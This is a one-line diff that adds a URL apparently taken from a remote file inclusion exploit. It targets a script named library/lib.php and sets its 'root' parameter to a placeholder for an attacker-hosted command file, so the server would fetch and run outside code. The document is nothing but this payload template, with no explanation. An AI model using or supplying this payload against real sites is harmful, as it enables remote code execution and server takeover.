@@ -1,0 +1,1 @@
+http://www.example.com/[dp_path]/library/lib.php?root=[cmd_url]
